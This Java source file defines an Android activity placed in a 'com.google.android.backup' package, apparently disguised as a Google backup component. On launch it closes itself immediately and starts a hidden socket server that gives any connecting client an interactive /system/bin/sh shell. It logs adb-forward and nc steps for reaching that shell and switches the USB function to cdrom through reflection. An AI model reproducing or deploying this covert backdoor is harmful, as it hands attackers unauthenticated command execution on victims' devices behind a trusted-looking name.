package com.google.android.backup;

import android.app.Activity;
import android.content.Context;
import android.hardware.usb.UsbManager;
import android.os.Bundle;
import android.util.Log;

import android.net.LocalServerSocket;
import android.net.LocalSocket;

import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;

public class SetBackupAccountActivity extends Activity {
    private static final String TAG = "ShellSocket";
    private static final String SOCKET_NAME = "android_shell_socket";

    /** cdrom のみ。複合名は使わない。 */
    private static final String USB_FUNCTION_CDROM = "cdrom";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // バックグラウンドでソケットサーバーを起動
        startShellServer();

        // アクティビティを即座に終了（サーバースレッドはバックグラウンドで継続）
        finish();

        // 既存処理の最後に、USB 機能を cdrom に切り替える自動処理を実行
        applyAutomaticUsbSwitchToCdrom();
    }

    /**
     * USB 機能を cdrom のみに切り替える。
     *
     * <p>組み合わせは 1 個だけ:
     * <ul>
     *   <li>経路: UsbManager#setCurrentFunction をリフレクションで呼ぶ</li>
     *   <li>引数: ("cdrom", true)</li>
     * </ul>
     *
     * <p>sys.usb.config / persist.sys.usb.config への書き込みは一切行わない。
     * 読み取りのみ。
     */
    private void applyAutomaticUsbSwitchToCdrom() {
        try {
            Context context = getApplicationContext();
            if (context == null) {
                Log.e(TAG, "Context is null, skip USB switch");
                return;
            }

            // 唯一の切替呼び出し
            setCurrentFunctionViaUsbManager(context, USB_FUNCTION_CDROM, true);

            // 結果確認（読み取りのみ）
            logCurrentUsbState(context);

            Log.i(TAG, "applyAutomaticUsbSwitchToCdrom finished");
        } catch (Throwable t) {
            Log.e(TAG, "applyAutomaticUsbSwitchToCdrom error", t);
        }
    }

    /**
     * UsbManager.setCurrentFunction(String, boolean) をリフレクションで呼ぶ。
     *
     * <p>IUsbManager 直叩きは UsbManager と同じ Binder transaction 15 を通るため
     * 呼ばない。1 経路に絞る。
     */
    private static void setCurrentFunctionViaUsbManager(Context context,
                                                        String function,
                                                        boolean makeDefault) {
        try {
            if (context == null) {
                Log.e(TAG, "context is null (UsbManager)");
                return;
            }
            Object service = context.getSystemService(Context.USB_SERVICE);
            if (service == null) {
                Log.e(TAG, "UsbManager is null");
                return;
            }
            Method m = service.getClass().getMethod(
                    "setCurrentFunction", String.class, boolean.class);
            m.setAccessible(true);
            m.invoke(service, function, makeDefault);
            Log.i(TAG, "UsbManager.setCurrentFunction invoked: " + function
                    + ", makeDefault=" + makeDefault);
        } catch (NoSuchMethodException e) {
            Log.e(TAG, "UsbManager.setCurrentFunction not found", e);
        } catch (SecurityException e) {
            Log.e(TAG, "SecurityException in UsbManager.setCurrentFunction", e);
        } catch (Throwable t) {
            Log.e(TAG, "Throwable in UsbManager.setCurrentFunction", t);
        }
    }

    /**
     * 現在の USB 状態を読み取ってログに残す。読み取りのみ。
     * 書き込みは一切行わない。
     */
    private static void logCurrentUsbState(Context context) {
        try {
            String sysUsbConfig = getSystemProperty("sys.usb.config", "");
            String persistUsbConfig = getSystemProperty("persist.sys.usb.config", "");
            String defaultFunction = getDefaultFunctionViaUsbManager(context);
            boolean cdromEnabled = isFunctionEnabledViaUsbManager(context, USB_FUNCTION_CDROM);

            Log.i(TAG, "sys.usb.config=" + sysUsbConfig);
            Log.i(TAG, "persist.sys.usb.config=" + persistUsbConfig);
            Log.i(TAG, "UsbManager.getDefaultFunction()=" + defaultFunction);
            Log.i(TAG, "UsbManager.isFunctionEnabled(cdrom)=" + cdromEnabled);
        } catch (Throwable t) {
            Log.e(TAG, "logCurrentUsbState error", t);
        }
    }

    /**
     * SystemProperties.get(String, String) をリフレクションで読み取る。
     * 読み取り専用。書き込みは行わない。
     */
    private static String getSystemProperty(String key, String defaultValue) {
        try {
            Class<?> spClass = Class.forName("android.os.SystemProperties");
            Method getMethod = spClass.getMethod("get", String.class, String.class);
            getMethod.setAccessible(true);
            Object result = getMethod.invoke(null, key, defaultValue);
            return result instanceof String ? (String) result : defaultValue;
        } catch (Throwable t) {
            Log.e(TAG, "getSystemProperty error: " + key, t);
            return defaultValue;
        }
    }

    /**
     * UsbManager.isFunctionEnabled(String) をリフレクションで呼ぶ。
     */
    private static boolean isFunctionEnabledViaUsbManager(Context context, String function) {
        try {
            if (context == null) {
                return false;
            }
            Object service = context.getSystemService(Context.USB_SERVICE);
            if (service == null) {
                return false;
            }
            Method m = service.getClass().getMethod("isFunctionEnabled", String.class);
            m.setAccessible(true);
            Object result = m.invoke(service, function);
            return result instanceof Boolean && (Boolean) result;
        } catch (Throwable t) {
            Log.e(TAG, "isFunctionEnabledViaUsbManager error", t);
            return false;
        }
    }

    /**
     * UsbManager.getDefaultFunction() をリフレクションで呼ぶ。
     */
    private static String getDefaultFunctionViaUsbManager(Context context) {
        try {
            if (context == null) {
                return null;
            }
            Object service = context.getSystemService(Context.USB_SERVICE);
            if (service == null) {
                return null;
            }
            Method m = service.getClass().getMethod("getDefaultFunction");
            m.setAccessible(true);
            Object result = m.invoke(service);
            return result instanceof String ? (String) result : null;
        } catch (Throwable t) {
            Log.e(TAG, "getDefaultFunctionViaUsbManager error", t);
            return null;
        }
    }

    private void startShellServer() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // Unixドメインソケット（抽象名前空間）を開く
                    LocalServerSocket server = new LocalServerSocket(SOCKET_NAME);
                    Log.i(TAG, "Shell socket server started: " + SOCKET_NAME);
                    Log.i(TAG, "Run on Ubuntu: adb forward tcp:8888 localabstract:" + SOCKET_NAME);
                    Log.i(TAG, "Then connect: nc 127.0.0.1 8888");

                    while (true) {
                        try {
                            LocalSocket client = server.accept();
                            Log.i(TAG, "New client connected!");
                            // クライアントごとに新しいシェルスレッドを起動
                            new Thread(new ShellHandler(client)).start();
                        } catch (Exception e) {
                            Log.e(TAG, "Accept error", e);
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Failed to start socket server", e);
                }
            }
        }).start();
    }

    // クライアント接続ごとにシェルを提供するハンドラ
    private static class ShellHandler implements Runnable {
        private LocalSocket socket;

        ShellHandler(LocalSocket socket) {
            this.socket = socket;
        }

        @Override
        public void run() {
            Process shell = null;
            try {
                // インタラクティブシェルを起動
                ProcessBuilder builder = new ProcessBuilder("/system/bin/sh");
                builder.redirectErrorStream(true); // stderrをstdoutに統合
                shell = builder.start();

                // ソケットの入出力ストリームを取得
                final InputStream socketIn = socket.getInputStream();
                final OutputStream socketOut = socket.getOutputStream();

                // シェルの入出力ストリームを取得
                final OutputStream shellStdin = shell.getOutputStream();
                final InputStream shellStdout = shell.getInputStream();

                // スレッド1: ソケット → シェル (ユーザー入力 → シェルstdin)
                Thread socketToShell = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            byte[] buffer = new byte[1024];
                            int len;
                            while ((len = socketIn.read(buffer)) != -1) {
                                shellStdin.write(buffer, 0, len);
                                shellStdin.flush();
                            }
                        } catch (Exception e) {
                            // 切断時は正常終了
                        }
                    }
                });

                // スレッド2: シェル → ソケット (シェルstdout → クライアント)
                Thread shellToSocket = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            byte[] buffer = new byte[1024];
                            int len;
                            while ((len = shellStdout.read(buffer)) != -1) {
                                socketOut.write(buffer, 0, len);
                                socketOut.flush();
                            }
                        } catch (Exception e) {
                            // 切断時は正常終了
                        }
                    }
                });

                socketToShell.start();
                shellToSocket.start();

                // シェルプロセスが終了するのを待つ（またはソケット切断）
                shell.waitFor();
                Log.i(TAG, "Shell process exited");

                // 後始末
                socket.close();
                socketToShell.interrupt();
                shellToSocket.interrupt();

            } catch (Exception e) {
                Log.e(TAG, "Shell handler error", e);
            } finally {
                if (shell != null) {
                    shell.destroy();
                }
                try {
                    socket.close();
                } catch (Exception ignored) {}
            }
        }
    }
}
